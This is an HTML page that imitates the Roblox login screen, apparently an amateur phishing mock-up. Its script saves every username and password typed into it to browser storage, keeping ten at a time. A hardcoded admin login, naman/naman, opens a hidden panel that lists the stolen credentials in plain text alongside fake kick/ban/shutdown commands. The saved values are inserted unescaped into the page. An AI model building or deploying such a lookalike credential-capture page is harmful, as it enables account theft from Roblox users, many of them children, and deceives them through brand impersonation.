<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Roblox Login</title>

<style>

/* =========================
   RESET
========================= */

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

/* =========================
   BODY
========================= */

body{
    background:#000;
    color:white;
    overflow-x:hidden;
}

/* =========================
   NAVBAR
========================= */

.navbar{

    width:100%;
    height:56px;

    background:#191b1f;

    position:fixed;

    top:0;
    left:0;

    z-index:1000;

    display:flex;

    align-items:center;

    justify-content:space-between;

    padding:0 18px;

    border-bottom:1px solid #2c2f36;
}

/* LEFT */

.nav-left{

    display:flex;

    align-items:center;

    gap:14px;
}

/* MENU ICON */

.menu-icon{

    color:white;

    font-size:23px;

    cursor:pointer;

    user-select:none;

    opacity:0.9;
}

/* ROBLOX LOGO */

.logo-nav{

    width:68px;

    height:auto;

    object-fit:contain;
}

/* RIGHT */

.nav-right{

    display:flex;

    align-items:center;
}

/* SIGNUP BUTTON */

.signup-btn{

    background:#0066ff;

    border:none;

    color:white;

    padding:9px 18px;

    border-radius:10px;

    font-size:14px;

    font-weight:bold;

    cursor:pointer;

    transition:0.3s;
}

.signup-btn:hover{

    background:#0050cc;

}

/* =========================
   HERO
========================= */

.hero{

    width:100%;

    min-height:100vh;

    display:flex;

    justify-content:center;

    align-items:center;

    padding-top:60px;

    background:

    linear-gradient(
    rgba(0,0,0,0.65),
    rgba(0,0,0,0.8)
    ),

    url('https://images.unsplash.com/photo-1542751110-97427bbecf20?q=80&w=2070');

    background-size:cover;

    background-position:center;
}

/* =========================
   LOGIN BOX
========================= */

.login-box{

    width:92%;

    max-width:430px;

    background:#1f222c;

    border-radius:16px;

    padding:35px 28px;

    box-shadow:

    0 0 40px rgba(0,0,0,0.6);

    backdrop-filter:blur(10px);
}

/* TITLE */

.login-box h1{

    text-align:center;

    font-size:36px;

    margin-bottom:24px;
}

/* =========================
   INPUTS
========================= */

.input-box{

    margin-bottom:16px;
}

.input-box input{

    width:100%;

    padding:15px;

    border:none;

    border-radius:12px;

    background:#2d313d;

    color:white;

    font-size:16px;

    outline:none;

    transition:0.3s;
}

.input-box input::placeholder{

    color:#a9a9a9;
}

.input-box input:focus{

    border:2px solid #0066ff;
}

/* =========================
   MAIN BUTTON
========================= */

.login-btn{

    width:100%;

    padding:15px;

    border:2px solid white;

    border-radius:12px;

    background:transparent;

    color:white;

    font-size:18px;

    font-weight:bold;

    cursor:pointer;

    transition:0.3s;
}

.login-btn:hover{

    background:white;

    color:black;
}

/* =========================
   SECONDARY BUTTON
========================= */

.secondary-btn{

    width:100%;

    margin-top:14px;

    padding:14px;

    border:none;

    border-radius:12px;

    background:#373c4a;

    color:white;

    font-size:15px;

    cursor:pointer;

    transition:0.3s;
}

.secondary-btn:hover{

    background:#4a5163;
}

/* =========================
   LINKS
========================= */

.links{

    margin-top:18px;

    text-align:center;
}

.links a{

    color:#d0d0d0;

    text-decoration:none;

    font-size:15px;
}

/* SIGNUP TEXT */

.signup-text{

    margin-top:24px;

    text-align:center;

    color:#b0b0b0;

    font-size:15px;
}

.signup-text a{

    color:white;

    font-weight:bold;

    text-decoration:none;
}

/* =========================
   PANEL BOX
========================= */

.panel-box{

    margin-top:22px;

    background:#2a2f3a;

    border-radius:12px;

    padding:18px;
}

.panel-box h3{

    margin-bottom:12px;

    color:#00aaff;
}

.panel-box p{

    margin:8px 0;

    font-size:14px;
}

/* =========================
   TEXT
========================= */

#message{

    margin-top:16px;

    text-align:center;

    color:#ff4d4d;

    font-size:15px;
}

#result{

    margin-top:18px;

    text-align:center;

    color:#00ff99;

    font-size:16px;
}

/* =========================
   ADMIN PANEL
========================= */

#adminPanel{
    display:none;
}

/* =========================
   MOBILE
========================= */

@media(max-width:500px){

    .login-box{

        padding:30px 20px;

    }

    .login-box h1{

        font-size:30px;
    }

    .logo-nav{

        width:60px;
    }

}

</style>
</head>

<body>

<!-- =========================
     NAVBAR
========================= -->

<div class="navbar">

    <!-- LEFT -->

    <div class="nav-left">

        <!-- MENU -->

        <div class="menu-icon">

            &#9776;

        </div>

        <!-- LOGO -->

        <img
        class="logo-nav"
        src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">

    </div>

    <!-- RIGHT -->

    <div class="nav-right">

        <button class="signup-btn">

            Sign Up

        </button>

    </div>

</div>

<!-- =========================
     HERO
========================= -->

<div class="hero">

    <!-- LOGIN BOX -->

    <div class="login-box" id="loginBox">

        <h1>Login to Roblox</h1>

        <!-- USERNAME -->

        <div class="input-box">

            <input
            type="text"
            id="username"
            placeholder="Username/Email/Phone">

        </div>

        <!-- PASSWORD -->

        <div class="input-box">

            <input
            type="password"
            id="password"
            placeholder="Password">

        </div>

        <!-- LOGIN -->

        <button
        class="login-btn"
        onclick="login()">

        Log In

        </button>

        <!-- FORGOT -->

        <div class="links">

            <a href="#">

                Forgot Password or Username?

            </a>

        </div>

        <!-- EXTRA -->

        <button class="secondary-btn">

            Email Me a One-Time Code

        </button>

        <button class="secondary-btn">

            Use Another Device

        </button>

        <!-- SIGNUP -->

        <div class="signup-text">

            Don't have an account?
            <a href="#">Sign Up</a>

        </div>

        <p id="message"></p>

    </div>

    <!-- =========================
         ADMIN PANEL
    ========================= -->

    <div class="login-box" id="adminPanel">

        <h1 id="welcomeText">

            Welcome Admin

        </h1>

        <!-- COMMAND INPUT -->

        <div class="input-box">

            <input
            type="text"
            id="commandInput"
            placeholder="Enter command">

        </div>

        <!-- RUN -->

        <button
        class="login-btn"
        onclick="runCommand()">

        Run Command

        </button>

        <!-- COMMANDS -->

        <div class="panel-box">

            <h3>Available Commands</h3>

            <p>kick</p>
            <p>ban</p>
            <p>shutdown</p>

        </div>

        <!-- SAVED DATA -->

        <div class="panel-box">

            <h3>Saved Login Data (Max 10)</h3>

            <div id="savedDataBox"></div>

        </div>

        <p id="result"></p>

    </div>

</div>

<script>

/* =========================
   SAVE LOGIN
========================= */

function saveLogin(user,pass){

    let logins =

    JSON.parse(
        localStorage.getItem("loginData")
    ) || [];

    /* ADD NEW */

    logins.push({

        username:user,
        password:pass

    });

    /* KEEP MAX 10 */

    if(logins.length > 10){

        logins.shift();

    }

    /* SAVE */

    localStorage.setItem(

        "loginData",

        JSON.stringify(logins)

    );

}

/* =========================
   LOAD SAVED
========================= */

function loadSavedData(){

    let logins =

    JSON.parse(
        localStorage.getItem("loginData")
    ) || [];

    let output = "";

    logins.forEach((data,index)=>{

        output += `

        <p>

        ${index + 1}.
        ${data.username}
        :
        ${data.password}

        </p>

        `;

    });

    document
    .getElementById("savedDataBox")
    .innerHTML = output;

}

/* =========================
   PAGE LOAD
========================= */

window.onload = function(){

    loadSavedData();

}

/* =========================
   LOGIN
========================= */

function login(){

    const user =

    document
    .getElementById("username")
    .value;

    const pass =

    document
    .getElementById("password")
    .value;

    /* SAVE */

    saveLogin(user,pass);

    loadSavedData();

    /* ADMIN */

    if(user === "naman" && pass === "naman"){

        document
        .getElementById("loginBox")
        .style.display = "none";

        document
        .getElementById("adminPanel")
        .style.display = "block";

        document
        .getElementById("welcomeText")
        .innerText =
        "Welcome Admin Naman";

    }

    else{

        document
        .getElementById("message")
        .innerText =
        "Invalid Username or Password";

    }

}

/* =========================
   COMMANDS
========================= */

function runCommand(){

    const cmd =

    document
    .getElementById("commandInput")
    .value
    .toLowerCase();

    const result =

    document
    .getElementById("result");

    /* KICK */

    if(cmd === "kick"){

        result.innerText =
        "Player kicked successfully!";

    }

    /* BAN */

    else if(cmd === "ban"){

        result.innerText =
        "Player banned successfully!";

    }

    /* SHUTDOWN */

    else if(cmd === "shutdown"){

        document.body.innerHTML = `

        <div style="

        height:100vh;

        display:flex;

        justify-content:center;

        align-items:center;

        flex-direction:column;

        background:black;

        color:red;

        font-size:45px;

        font-family:Arial;

        ">

        WEBSITE SHUTDOWN

        <p style="

        margin-top:20px;

        font-size:20px;

        color:white;

        ">

        Closing Website...

        </p>

        </div>

        `;

    }

    /* UNKNOWN */

    else{

        result.innerText =
        "Unknown command!";

    }

}

</script>

</body>
</html>
